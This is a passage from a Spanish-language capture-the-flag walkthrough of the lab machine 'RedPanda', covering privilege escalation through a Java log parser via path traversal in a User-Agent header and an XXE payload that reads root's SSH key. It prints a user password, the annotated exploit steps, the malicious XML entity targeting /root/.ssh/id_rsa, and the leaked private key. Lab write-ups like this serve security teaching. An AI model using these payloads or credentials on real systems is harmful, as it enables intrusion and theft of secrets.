woodenk@10.10.11.170<span class="se">\'</span>s password: RedPandazRule
</pre></table></code></div></div><p>¡Ganamos acceso con una shell funcional!</p><h2 id="escalando-privilegios"><span class="mr-2">Escalando privilegios</span><a href="#escalando-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="analizando-procesos-con-pspy"><span class="mr-2">Analizando procesos con pspy</span><a href="#analizando-procesos-con-pspy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Haciendo un reconocimiento básico, no encontramos nada de lo que nos podamos aprovechar, así que he optado por usar <code class="language-plaintext highlighter-rouge">pspy</code> para analizar procesos. Entre los más relevantes encontramos:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>2040   | /bin/sh <span class="nt">-c</span> <span class="nb">sudo</span> <span class="nt">-u</span> woodenk /opt/cleanup.sh
CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>2051   | /bin/bash /opt/cleanup.sh 
CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>2052   | /usr/bin/find /tmp <span class="nt">-name</span> <span class="k">*</span>.xml <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="p">;</span> 
CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>2053   | /usr/bin/find /var/tmp <span class="nt">-name</span> <span class="k">*</span>.xml <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="p">;</span> 
CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>2054   | /usr/bin/find /dev/shm <span class="nt">-name</span> <span class="k">*</span>.xml <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="p">;</span> 
CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>2055   | /usr/bin/find /home/woodenk <span class="nt">-name</span> <span class="k">*</span>.xml <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="p">;</span>
CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>2058   | /usr/bin/find /tmp <span class="nt">-name</span> <span class="k">*</span>.jpg <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="p">;</span> 
CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>2049   | /usr/bin/find /var/tmp <span class="nt">-name</span> <span class="k">*</span>.jpg <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="p">;</span> 
CMD: <span class="nv">UID</span><span class="o">=</span>1000 <span class="nv">PID</span><span class="o">=</span>2050   | /usr/bin/find /home/woodenk <span class="nt">-name</span> <span class="k">*</span>.jpg <span class="nt">-exec</span> <span class="nb">rm</span> <span class="nt">-rf</span> <span class="o">{}</span> <span class="p">;</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">root</code> está ejecutando un script como el usuario <code class="language-plaintext highlighter-rouge">woodenk</code> y vemos lo que hace el script —también podríamos verlo directamente con <code class="language-plaintext highlighter-rouge">cat</code>—. Además, se están eliminando archivos con extensión<code class="language-plaintext highlighter-rouge">.jpg</code> y <code class="language-plaintext highlighter-rouge">.xml</code>.</p><h3 id="analizando-código-en-java-y-explotando-un-xxe"><span class="mr-2">Analizando código en Java y explotando un XXE</span><a href="#analizando-código-en-java-y-explotando-un-xxe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Anteriormente hemos visto que el usuario <code class="language-plaintext highlighter-rouge">root</code> está ejecutando el compilado del proyecto <code class="language-plaintext highlighter-rouge">java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar</code>, —también aparece en lo que nos reporta <code class="language-plaintext highlighter-rouge">pspy</code>—. Revisando un poco la ruta <code class="language-plaintext highlighter-rouge">/opt/</code> tambíen encontramos un directorio llamado <code class="language-plaintext highlighter-rouge">logParser</code>, el cual contiene un archivo interesante: parece de la applicación web.</p><p>Revisando un poco el código, vemos que se está escribiendo un archivo <code class="language-plaintext highlighter-rouge">xml</code>, —seguro es para exportarlo—. Además del código anterior, también hemos encontrado un archivo de <code class="language-plaintext highlighter-rouge">logs</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>woodenk@redpanda:/opt/panda_search<span class="nv">$ </span><span class="nb">cat </span>redpanda.log
200||10.10.14.133||Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0||/stats
200||10.10.14.133||Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0||/stats
200||10.10.14.133||Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0||/stats
200||10.10.16.13||Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/103.0.5060.114 Safari/537.36||/search
200||10.10.14.133||Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0||/stats
200||10.10.16.13||Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/103.0.5060.114 Safari/537.36||/search
200||10.10.14.133||Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="p">;</span> rv:102.0<span class="o">)</span> Gecko/20100101 Firefox/102.0||/stats
</pre></table></code></div></div><p>Realicemos una petición:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ curl http://10.10.11.170:8080/
</pre></table></code></div></div><p>Si volvemos a revisar el archivo de logs, nos aprece la petición:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>200||10.10.16.18||curl/7.84.0||/
</pre></table></code></div></div><p>En el código <em>Java</em> encontrado, podemos visualizar cómo se está parseando la información. Además vemos que lee los <code class="language-plaintext highlighter-rouge">logs</code> y realiza ciertas acciones. Si tenemos el control del input en esta parte, podríamos inyectar código. Comentaré el código según los parámetros que enviaré para una mejor comprensión.</p><blockquote class="prompt-info"><div><p>Recordemos que todas las aplicaciones Java comienzan ejecutando la función <code class="language-plaintext highlighter-rouge">main</code>:</p></div></blockquote><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
</pre><td class="rouge-code"><pre><span class="n">woodenk</span><span class="nd">@redpanda</span><span class="o">:/</span><span class="n">opt</span><span class="o">/</span><span class="n">credit</span><span class="o">-</span><span class="n">score</span><span class="o">/</span><span class="nc">LogParser</span><span class="o">/</span><span class="kd">final</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">main</span><span class="o">/</span><span class="n">java</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">logparser</span><span class="err">$</span> <span class="n">cat</span> <span class="nc">App</span><span class="o">.</span><span class="na">java</span> 
<span class="kn">package</span> <span class="nn">com.logparser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.BufferedWriter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileWriter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.drew.imaging.jpeg.JpegMetadataReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.imaging.jpeg.JpegProcessingException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.metadata.Directory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.metadata.Metadata</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.metadata.Tag</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.jdom2.JDOMException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.input.SAXBuilder</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.output.Format</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.output.XMLOutputter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">App</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Map</span> <span class="nf">parseLog</span><span class="o">(</span><span class="nc">String</span> <span class="n">line</span><span class="o">)</span> <span class="o">{</span>

    <span class="c1">// line = 200||10.10.16.18||||/../../../../../../home/woodenk/linux.jpg||/</span>
    <span class="c1">// strings = [200, 10.10.16.18, "", /../../../../../../home/woodenk/linux.jpg, ""]</span>
    <span class="nc">String</span><span class="o">[]</span> <span class="n">strings</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">"\\|\\|"</span><span class="o">);</span>
    <span class="nc">Map</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>

    <span class="c1">// "status_code" : "200"</span>
    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"status_code"</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">strings</span><span class="o">[</span><span class="mi">0</span><span class="o">]));</span>
      
    <span class="c1">// "ip" : "10.10.16.18"</span>
    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"ip"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">1</span><span class="o">]);</span>

    <span class="c1">// "user_agent" : ""</span>
    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"user_agent"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">2</span><span class="o">]);</span>

    <span class="c1">// "uri" : "/../../../../../../home/woodenk/linux.jpg"</span>
    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"uri"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">3</span><span class="o">]);</span>
      
    <span class="k">return</span> <span class="n">map</span><span class="o">;</span>
  <span class="o">}</span>
    
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isImage</span><span class="o">(</span><span class="nc">String</span> <span class="n">filename</span><span class="o">){</span>

    <span class="c1">// filename = 200||10.10.16.18||||/../../../../../../home/woodenk/linux.jpg||/</span>
    <span class="k">if</span><span class="o">(</span><span class="n">filename</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">".jpg"</span><span class="o">)){</span>
      <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
  <span class="o">}</span>
    
  <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">getArtist</span><span class="o">(</span><span class="nc">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">JpegProcessingException</span><span class="o">{</span>
    <span class="c1">// uri = /../../../../../../home/woodenk/linux.jpg</span>

    <span class="c1">// fullpath = /opt/panda_search/src/main/resources/static/../../../../../../home/woodenk/linux.jpg</span>
    <span class="nc">String</span> <span class="n">fullpath</span> <span class="o">=</span> <span class="s">"/opt/panda_search/src/main/resources/static"</span> <span class="o">+</span> <span class="n">uri</span><span class="o">;</span>
      
    <span class="c1">// Lee el archivo de la variable fullpath, pero hemos hecho un 'path-traversal'</span>
    <span class="c1">// así que el path que está leyendo la variable jpgFile sería:</span>
    <span class="c1">// fullpath = /home/woodenk/linux.jpg</span>

    <span class="nc">File</span> <span class="n">jpgFile</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">fullpath</span><span class="o">);</span>
    <span class="nc">Metadata</span> <span class="n">metadata</span> <span class="o">=</span> <span class="nc">JpegMetadataReader</span><span class="o">.</span><span class="na">readMetadata</span><span class="o">(</span><span class="n">jpgFile</span><span class="o">);</span>
    <span class="k">for</span><span class="o">(</span><span class="nc">Directory</span> <span class="n">dir</span> <span class="o">:</span> <span class="n">metadata</span><span class="o">.</span><span class="na">getDirectories</span><span class="o">())</span> <span class="o">{</span>
      <span class="k">for</span><span class="o">(</span><span class="nc">Tag</span> <span class="n">tag</span> <span class="o">:</span> <span class="n">dir</span><span class="o">.</span><span class="na">getTags</span><span class="o">()){</span>

        <span class="c1">// Para este punto ya debimos haber subido una imagen con</span>
        <span class="c1">// un tag en la metadata llamada 'Artist'</span>
        <span class="c1">// para este caso, el valor de este tag debería ser</span>
        <span class="c1">// el nombre de nuestro archivo que se leerá para</span>
        <span class="c1">// interpretar el código y explotar el XXE</span>
        <span class="c1">// el valor que he puesto como metada ha sido: ../home/woodenk/new</span>

        <span class="k">if</span><span class="o">(</span><span class="n">tag</span><span class="o">.</span><span class="na">getTagName</span><span class="o">()</span> <span class="o">==</span> <span class="s">"Artist"</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// ../home/woodenk/new</span>
            <span class="k">return</span> <span class="n">tag</span><span class="o">.</span><span class="na">getDescription</span><span class="o">();</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>
      <span class="k">return</span> <span class="s">"N/A"</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">addViewTo</span><span class="o">(</span><span class="nc">String</span> <span class="n">path</span><span class="o">,</span> <span class="nc">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">JDOMException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">{</span>
    <span class="c1">// path = "/credits/../home/woodenks/new_creds.xml"</span>
    <span class="c1">// uri = "/../../../../../../home/woodenk/linux.jpg"</span>

    <span class="nc">SAXBuilder</span> <span class="n">saxBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SAXBuilder</span><span class="o">();</span>
    <span class="nc">XMLOutputter</span> <span class="n">xmlOutput</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLOutputter</span><span class="o">();</span>
    <span class="n">xmlOutput</span><span class="o">.</span><span class="na">setFormat</span><span class="o">(</span><span class="nc">Format</span><span class="o">.</span><span class="na">getPrettyFormat</span><span class="o">());</span>

    <span class="c1">// Por el path traversal aplicado el archivo que estaremos leyendo es:</span>
    <span class="c1">// path = "/home/woodenk/new_creds.xml"</span>
    <span class="c1">// Para este punto ya hemos subido nuestro archivo XML malicioso</span>
    
    <span class="nc">File</span> <span class="n">fd</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>

    <span class="c1">// Lee la estructura del XML</span>
    <span class="nc">Document</span> <span class="n">doc</span> <span class="o">=</span> <span class="n">saxBuilder</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">fd</span><span class="o">);</span>
    
    <span class="nc">Element</span> <span class="n">rootElement</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="na">getRootElement</span><span class="o">();</span>

    <span class="k">for</span><span class="o">(</span><span class="nc">Element</span> <span class="nl">el:</span> <span class="n">rootElement</span><span class="o">.</span><span class="na">getChildren</span><span class="o">())</span> <span class="o">{</span>

    <span class="c1">// En nuestro archivo XML debimos haber puesto una estructura con</span>
    <span class="c1">// la etiqueta &lt;image&gt; para llegar hasta aquí</span>
      <span class="k">if</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">==</span> <span class="s">"image"</span><span class="o">)</span> <span class="o">{</span>

      <span class="c1">// ... y dentro de la etiqueta &lt;image&gt; una etiqueta &lt;uri&gt;</span>
      <span class="c1">// comprobación: ""/../../../../../../home/woodenk/linux.jpg"? True</span>
        <span class="k">if</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"uri"</span><span class="o">).</span><span class="na">getText</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">uri</span><span class="o">)){</span>   
          <span class="c1">// Esto de aca dentro es poco relevante</span>
          <span class="nc">Integer</span> <span class="n">totalviews</span> <span class="o">=</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"totalviews"</span><span class="o">).</span><span class="na">getText</span><span class="o">())</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
          <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Total views:"</span> <span class="o">+</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">));</span>
          <span class="n">rootElement</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"totalviews"</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="nc">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">totalviews</span><span class="o">));</span>
          <span class="nc">Integer</span> <span class="n">views</span> <span class="o">=</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"views"</span><span class="o">).</span><span class="na">getText</span><span class="o">());</span>
          <span class="n">el</span><span class="o">.</span><span class="na">getChild</span><span class="o">(</span><span class="s">"views"</span><span class="o">).</span><span class="na">setText</span><span class="o">(</span><span class="nc">Integer</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">views</span> <span class="o">+</span> <span class="mi">1</span><span class="o">));</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>

    <span class="c1">// Llegados a este punto podemos obtener la ejecución de un comando </span>
    <span class="c1">// gracias al XML y lo que hayamos puesto </span>
    <span class="nc">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedWriter</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileWriter</span><span class="o">(</span><span class="n">fd</span><span class="o">));</span>

    <span class="c1">// File fd = new File(path);  doc = saxBuilder.build(fd);</span>
    <span class="c1">// ¡Ya se ha ejecutado el comando puesto en la entidad del XML malicioso</span>
    <span class="c1">// y hemos obtenido credenciales como root!</span>
    <span class="n">xmlOutput</span><span class="o">.</span><span class="na">output</span><span class="o">(</span><span class="n">doc</span><span class="o">,</span> <span class="n">writer</span><span class="o">);</span>
  <span class="o">}</span>
    
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">JDOMException</span><span class="o">,</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">JpegProcessingException</span> <span class="o">{</span>

    <span class="c1">//Aquí se leen los logs</span>
    <span class="nc">File</span> <span class="n">log_fd</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="s">"/opt/panda_search/redpanda.log"</span><span class="o">);</span>
    <span class="nc">Scanner</span> <span class="n">log_reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Scanner</span><span class="o">(</span><span class="n">log_fd</span><span class="o">);</span>
    <span class="k">while</span><span class="o">(</span><span class="n">log_reader</span><span class="o">.</span><span class="na">hasNextLine</span><span class="o">()){</span>

      <span class="c1">// line = 200||10.10.16.18||||/../../../../../../home/woodenk/linux.jpg||/</span>
      <span class="nc">String</span> <span class="n">line</span> <span class="o">=</span> <span class="n">log_reader</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
      <span class="k">if</span><span class="o">(!</span><span class="n">isImage</span><span class="o">(</span><span class="n">line</span><span class="o">)){</span>
          <span class="k">continue</span><span class="o">;</span>
      <span class="o">}</span>

      <span class="nc">Map</span> <span class="n">parsed_data</span> <span class="o">=</span> <span class="n">parseLog</span><span class="o">(</span><span class="n">line</span><span class="o">);</span>

      <span class="c1">// parsed_data.get("uri") = /../../../../../../home/woodenk/linux.jpg</span>
      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"uri"</span><span class="o">));</span>

      <span class="c1">// artist = ""../home/woodenk/new"</span>
      <span class="nc">String</span> <span class="n">artist</span> <span class="o">=</span> <span class="n">getArtist</span><span class="o">(</span><span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"uri"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>

      <span class="c1">// Artist: ../home/woodenk/new</span>
      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Artist: "</span> <span class="o">+</span> <span class="n">artist</span><span class="o">);</span>

      <span class="c1">// El path donde residirá el código el cual queremos que sea</span>
      <span class="c1">// interpretado</span>
      <span class="c1">// xmlPath = "/credits/../home/woodenk/new_creds.xml"</span>
      <span class="nc">String</span> <span class="n">xmlPath</span> <span class="o">=</span> <span class="s">"/credits/"</span> <span class="o">+</span> <span class="n">artist</span> <span class="o">+</span> <span class="s">"_creds.xml"</span><span class="o">;</span>
      <span class="n">addViewTo</span><span class="o">(</span><span class="n">xmlPath</span><span class="o">,</span> <span class="n">parsed_data</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"uri"</span><span class="o">).</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Procedamos a decargar cualquier imagen en nuestro equipo y agregar el tag “Artist” a la metadata:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>❯ exiftool <span class="nt">-Artist</span><span class="o">=</span><span class="s2">"/../../../../../../home/woodenk/linux.jpg"</span>
</pre></table></code></div></div><p>Y ahora creamos el archivo XML malicioso:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c">&lt;!--?xml version="1.0" ?--&gt;</span>
<span class="cp">&lt;!DOCTYPE replace [&lt;!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"&gt;</span> ]&gt;
<span class="nt">&lt;credits&gt;</span>
  <span class="nt">&lt;author&gt;</span>damian<span class="nt">&lt;/author&gt;</span>
  <span class="nt">&lt;image&gt;</span>
    <span class="nt">&lt;uri&gt;</span>/../../../../../../home/woodenk/linux.jpg<span class="nt">&lt;/uri&gt;</span>
    <span class="nt">&lt;privesc&gt;</span><span class="ni">&amp;key;</span><span class="nt">&lt;/privesc&gt;</span>
    <span class="nt">&lt;views&gt;</span>0<span class="nt">&lt;/views&gt;</span>
  <span class="nt">&lt;/image&gt;</span>
  <span class="nt">&lt;totalviews&gt;</span>0<span class="nt">&lt;/totalviews&gt;</span>
<span class="nt">&lt;/credits&gt;</span>
</pre></table></code></div></div><p>Ambos archivos los transferimos a la máquina víctima. Ambos archivos los movemos al directorio home de <code class="language-plaintext highlighter-rouge">woodenk</code>. Ahora simplemente realizamos una petición desde nuestro equipo:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl http://10.10.11.170 <span class="nt">-H</span> <span class="s1">'User-Agent: ||/../../../../../../home/woodenk/linux.jpg'</span>
</pre></table></code></div></div><p>Ahora, verifiquemos cambios en el archivo:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>woodenk@redpanda: watch <span class="nt">-n0</span> <span class="nb">cat </span>new_creds.xml
</pre></table></code></div></div><p>Después de un tiempo, nos aparece lo siguiente:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE replace [
  &lt;!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" &gt;</span>]&gt;
<span class="nt">&lt;credits&gt;</span>     
  <span class="nt">&lt;author&gt;</span>woodenk<span class="nt">&lt;/author&gt;</span>
  <span class="nt">&lt;image&gt;</span>
    <span class="nt">&lt;uri&gt;</span>/../../../../../../../../home/woodenk/linux.jpg<span class="nt">&lt;/uri&gt;</span>
    <span class="nt">&lt;priv&gt;</span>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----<span class="nt">&lt;/priv&gt;</span>
    <span class="nt">&lt;views&gt;</span>0<span class="nt">&lt;/views&gt;</span>
